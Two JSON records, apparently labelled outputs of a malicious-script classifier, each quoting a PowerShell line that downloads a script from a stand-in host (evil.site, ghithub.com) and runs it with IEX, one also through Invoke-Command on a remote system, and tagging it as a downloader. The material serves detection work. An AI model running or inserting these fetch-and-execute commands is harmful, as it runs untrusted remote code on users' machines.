{
  "summary": "The script constructs a command that downloads a PowerShell script from a remote URL and executes it via Invoke‑Expression.",
  "evidence": [
    {
      "code": "$code = 'IEX (New-Object Net.WebClient).DownloadString('https://evil.site/evil_code.ps1')'",
      "code_explain": "Creates a string that calls New‑Object Net.WebClient to fetch the contents of https://evil.site/evil_code.ps1 and immediately invokes the downloaded code with IEX. This is a classic downloader pattern that retrieves and runs remote code, indicating remote command execution and potential payload delivery.",
      "tag": "DOWNLOADER"
    },
    {
      "code": "Invoke-Expression $code",
      "code_explain": "Executes the previously built string as PowerShell code. Using Invoke‑Expression to run dynamically built commands is a common technique for executing untrusted or obfuscated payloads, bypassing static analysis and enabling arbitrary code execution.",
      "tag": "EXECUTION"
    }
  ],
  "explain": "The script downloads and runs code from an external domain without any validation, which is a typical malicious behavior used for initial compromise or payload delivery. The presence of a hard‑coded malicious URL and the use of Invoke‑Expression to execute the fetched script make the intent clearly offensive.",
  "is_malicious": "Malicious",
  "tag": "DOWNLOADER"
}

{
  "summary": "The script remotely executes a PowerShell payload on another host by downloading and running code from an external URL.",
  "evidence": [
    {
      "code": "Invoke-Command -ComputerName <remote_system> -ScriptBlock { ... }",
      "code_explain": "Uses PowerShell remoting to run a script block on a remote computer. This is a classic indicator of REMOTE_COMMAND_EXECUTION, allowing an attacker to execute arbitrary commands on another system.",
      "tag": "REMOTE_COMMAND_EXECUTION"
    },
    {
      "code": "IEX (New-Object Net.WebClient).DownloadString('http://ghithub.com/badProject')",
      "code_explain": "Creates a WebClient object, downloads the raw text from the supplied URL, and immediately executes it with Invoke‑Expression (IEX). This combines a DOWNLOADER (fetching code from the internet) with EXECUTION (running the fetched code) and is a common technique for delivering malicious payloads while bypassing static file inspection.",
      "tag": "DOWNLOADER"
    }
  ],
  "explain": "The script fetches PowerShell code from an untrusted external site and runs it on a remote system, a pattern that is typical of malicious downloader behavior and remote command execution. No legitimate defensive or administrative justification can be inferred from the code itself.",
  "is_malicious": "Malicious",
  "tag": "DOWNLOADER"
}

